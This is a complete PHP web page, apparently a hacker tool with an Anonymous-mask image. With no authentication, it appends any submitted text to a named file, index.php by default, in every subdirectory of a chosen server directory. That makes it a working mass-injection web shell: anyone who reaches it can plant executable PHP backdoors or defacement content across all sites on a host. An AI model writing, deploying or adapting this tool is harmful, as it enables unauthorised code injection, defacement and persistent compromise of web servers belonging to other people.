<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Text to Files</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 600px;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label, input, textarea {
            margin-bottom: 10px;
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        textarea {
            resize: vertical;
            height: 120px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: auto;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            background-color: #e7f3e7;
            border: 1px solid #d4e3d4;
            border-radius: 4px;
            text-align: center;
            font-size: 18px;
        }
        .message.error {
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        .message.success {
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .image-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .image-container img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="image-container">
            <img src="https://image.spreadshirtmedia.net/image-server/v1/designs/14727496,width=178,height=178,version=1385625201/fuck-anonymous-mask.png" alt="Image" width="400">
        </div>
        <h1>Add Text to Files</h1>
        <form method="post">
            <?php
            // Determine the current working directory
            $directory = getcwd();

            // Output the directory input with the initial value
            echo '<label for="directory">Directory Path:</label>';
            echo '<input type="text" id="directory" name="directory" value="' . htmlspecialchars($directory) . '" required><br>';
            ?>
            <label for="filename">Filename:</label>
            <input type="text" id="filename" name="filename" value="index.php" required><br>
            <label for="newtext">New Text:</label>
            <textarea id="newtext" name="newtext" rows="4" cols="50" required></textarea><br>
            <input type="submit" value="Add Text">
        </form>

        <?php
        // Handle form submission
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            // Validate inputs
            $directory = isset($_POST['directory']) ? $_POST['directory'] : '';
            $filename = isset($_POST['filename']) ? $_POST['filename'] : 'index.php';
            $newtext = isset($_POST['newtext']) ? $_POST['newtext'] : '';

            if (!empty($directory) && !empty($newtext) && !empty($filename)) {
                // Check if the directory is valid
                if (is_dir($directory)) {
                    // Open the directory and iterate over each item
                    $dirIterator = new DirectoryIterator($directory);

                    foreach ($dirIterator as $item) {
                        if ($item->isDir() && !$item->isDot()) {
                            $subDir = $item->getPathname();

                            // Construct the full file path for the target file in each subdirectory
                            $filePath = $subDir . DIRECTORY_SEPARATOR . $filename;

                            // Check if the file exists or create it
                            if (file_exists($filePath) || touch($filePath)) {
                                // Open the file in append mode ('a')
                                $appendVar = fopen($filePath, 'a');

                                // Check if file opened successfully
                                if ($appendVar) {
                                    // Write new line and new text to the file
                                    $wit1 = fwrite($appendVar, "\n"); // Ensure new line before new text
                                    $wit2 = fwrite($appendVar, $newtext);

                                    // Close the file
                                    fclose($appendVar);

                                    // Check if writing was successful
                                    if ($wit1 !== false && $wit2 !== false) {
                                        echo "<div class='message success'>Text added to file '{$filePath}' successfully.</div>";
                                    } else {
                                        echo "<div class='message error'>Failed to add text to file '{$filePath}'.</div>";
                                    }
                                } else {
                                    echo "<div class='message error'>Failed to open file '{$filePath}' for writing.</div>";
                                }
                            } else {
                                echo "<div class='message error'>Failed to create file '{$filePath}'.</div>";
                            }
                        }
                    }
                } else {
                    echo "<div class='message error'>The specified directory '{$directory}' is invalid.</div>";
                }
            } else {
                echo "<div class='message error'>Please fill out all required fields.</div>";
            }
        }
        ?>
    </div>
</body>
</html>
